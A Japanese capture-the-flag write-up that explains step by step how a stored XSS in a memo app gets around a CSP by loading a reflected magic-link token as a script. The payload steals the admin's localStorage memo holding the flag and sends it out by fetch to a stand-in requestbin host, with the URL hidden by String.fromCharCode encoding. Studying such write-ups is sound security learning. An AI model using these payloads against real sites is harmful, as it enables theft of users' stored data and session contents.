## 解法

1. メモにローカルストレージを抜き出すscriptを仕込みます

CSP(script-src 'self')が設定されているので単純なscriptタグでは発火しません

マジックリンクでのログインに失敗したときにユーザー入力(トークン)が反映されたレスポンスを返すので、ここでJavascriptを作成して`script src`で読み込みます

よって以下のコードで発火します

```html
<script src="/magic?token=alert(1)//"></script>
```

FLAGは管理者のローカルストレージにセットされているので以下のコードで盗みます

```js
fetch("https://requestbin.example.com/?ctf4bflag="+encodeURI(localStorage.getItem("memo")));
```

しかし`/magic?token=`でトークンがレスポンスに埋め込まれるときにエスケープされます

上記のJavascriptコードではダブルクオートがエスケープされるので`String.fromCharCode`を使って置き換えます

```js
fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,101,120,97,109,112,108,101,46,99,111,109,47,63,99,116,102,52,98,102,108,97,103,61)+encodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));
```

`+`をurl encodeします

```js
fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,101,120,97,109,112,108,101,46,99,111,109,47,63,99,116,102,52,98,102,108,97,103,61)%2BencodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));
```

scriptタグに仕込んでメモに書き込みます

```html
<script src="/magic?token=fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,101,120,97,109,112,108,101,46,99,111,109,47,63,99,116,102,52,98,102,108,97,103,61)%2BencodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));//"></script>
```

2. MagicLink機能でXSSを仕込んだアカウントにログインできるURLを生成します

<https://json.quals.beginners.seccon.jp/magic?token=23ae198f-ba6c-4b06-a4b1-438480578ffb>

3. 2で作成したURLをバグ報告ページで送信し、管理者にアクセスさせます

4. 管理者は送られたリンクを踏む前に自分のアカウントのページでFLAGをメモに書き込みます(途中まで記入したメモをローカルストレージへ保存する機能がついている)

5. 管理者はMagicLinkでXSSを仕込んだアカウントのページに遷移してそこで1のXSSが発火し、途中まで記入したメモが抜き取ることができます
